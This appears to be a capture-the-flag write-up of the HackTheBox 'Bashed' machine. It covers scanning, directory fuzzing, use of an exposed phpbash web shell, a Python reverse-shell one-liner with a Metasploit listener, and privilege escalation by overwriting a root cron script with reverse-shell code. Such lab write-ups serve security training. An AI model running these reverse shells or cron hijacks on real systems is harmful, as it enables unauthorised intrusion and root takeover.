# Bashed

## Nmap Scanning

```

sudo nmap -sS -sC 10.10.10.68

Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-07 06:45 EDT
Nmap scan report for bashed.htb (10.10.10.68)
Host is up (0.68s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
|_http-title: Arrexel's Development Site

Nmap done: 1 IP address (1 host up) scanned in 21.42 seconds
```

## Directory Fuzzing

```

ffuf -u http://10.10.10.68/FUZZ -w /usr/share/wordlists/dirb/common.txt:FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.68/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

                        [Status: 200, Size: 7743, Words: 2956, Lines: 162]
.htaccess               [Status: 403, Size: 295, Words: 22, Lines: 12]
.hta                    [Status: 403, Size: 290, Words: 22, Lines: 12]
.htpasswd               [Status: 403, Size: 295, Words: 22, Lines: 12]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10]
dev                     [Status: 301, Size: 308, Words: 20, Lines: 10]
fonts                   [Status: 301, Size: 310, Words: 20, Lines: 10]
images                  [Status: 301, Size: 311, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 7743, Words: 2956, Lines: 162]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10]
php                     [Status: 301, Size: 308, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]
uploads                 [Status: 301, Size: 312, Words: 20, Lines: 10]
:: Progress: [4614/4614] :: Job [1/1] :: 109 req/sec :: Duration: [0:00:54] :: Errors: 0 ::
```

inside the dev folder, there is two php file, phpbash.php, phpbash.min.ph

by clicking on phpbash.php, we get a web shell 

using python to get a shell 

`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.17.124",9000));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`

start a listener either using nc or metasploit

```

use multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set lhost 10.10.17.124
lhost => 10.10.17.124
msf6 exploit(multi/handler) > set lport 9000
lport => 9000
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.17.124:9000 
[*] Command shell session 1 opened (10.10.17.124:9000 -> 10.10.10.68:51162) at 2021-07-07 06:54:17 -0400

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python3 -c "import pty; pty.spawn('/bin/bash')"
www-data@bashed:/var/www/html/dev$ export TERM=xterm-256color               
export TERM=xterm-256color

www-data@bashed:/var/www/html/dev$ whoami
whoami
www-data

www-data@bashed:/var/www/html/dev$ cd /home
cd /home

www-data@bashed:/home$ ls
ls
arrexel  scriptmanager

www-data@bashed:/home$ cd arrexel
cd arrexel

www-data@bashed:/home/arrexel$ cat user.txt
cat user.txt
*******************************
```

lets check for sudo permission that we might have

```

www-data@bashed:/home/arrexel$ sudo -l
sudo -l

Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

lets upgrade to scriptmanager

```

www-data@bashed:/home/arrexel$ sudo -u scriptmanager bash
sudo -u scriptmanager bash

scriptmanager@bashed:/home/arrexel$ whoami
whoami
scriptmanager

scriptmanager@bashed:/home/arrexel$ sudo -l
sudo -l
[sudo] password for scriptmanager: 

Sorry, try again.
[sudo] password for scriptmanager: 

Sorry, try again.
[sudo] password for scriptmanager: 

sudo: 3 incorrect password attempts

scriptmanager@bashed:/home/arrexel$ 
```

change directory to __/tmp__ 

download `LinPeas.sh` 

run it, we found out about /scripts folder

```

scriptmanager@bashed:/scripts$ ls -l
ls -l
total 8
-rwxr-xr-x 1 scriptmanager scriptmanager 215 Jul  7 04:31 test.py
-rw-r--r-- 1 root          root           12 Jul  7 04:31 test.txt
```

```

scriptmanager@bashed:/scripts$ cat test.py

cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close

scriptmanager@bashed:/scripts$ cat test.txt
cat test.txt
testing 123!
```

tried to move test.py, but after sometime we again got the test.py, might be work of a cron job

## Privilege escalation

lets replace the content of test.py file with the following to get a sudo shell

```

cat test.py
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.17.124",9003))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

```
nc -lvnp 9003

# cat /root/root.txt
***********************************
```
